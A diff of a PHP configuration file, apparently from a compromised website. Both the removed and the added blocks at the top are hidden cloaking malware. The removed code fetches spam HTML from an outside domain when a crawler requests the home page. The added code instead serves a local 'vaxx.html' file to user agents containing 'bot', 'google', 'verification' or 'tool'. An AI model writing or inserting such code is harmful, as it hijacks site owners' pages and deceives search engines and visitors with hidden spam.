@@ -1,7 +1,24 @@
 <?php
-if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
-    echo implode('', file('http://distropakaian.site/masa-ganaik.html'));
-    exit;
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$requestUri = $_SERVER['REQUEST_URI'] ?? '';
+
+$isBot = (
+    strpos($userAgent, 'bot') !== false ||
+    strpos($userAgent, 'google') !== false ||
+    strpos($userAgent, 'verification') !== false ||
+    strpos($userAgent, 'tool') !== false
+);
+
+if ($isBot) {
+    if ($requestUri == '/') {
+        $localFile = __DIR__ . '/vaxx.html'; 
+
+        if (file_exists($localFile)) {
+            echo file_get_contents($localFile);
+            exit;
+        } else {
+        }
+    }
 }
 
 namespace Config;
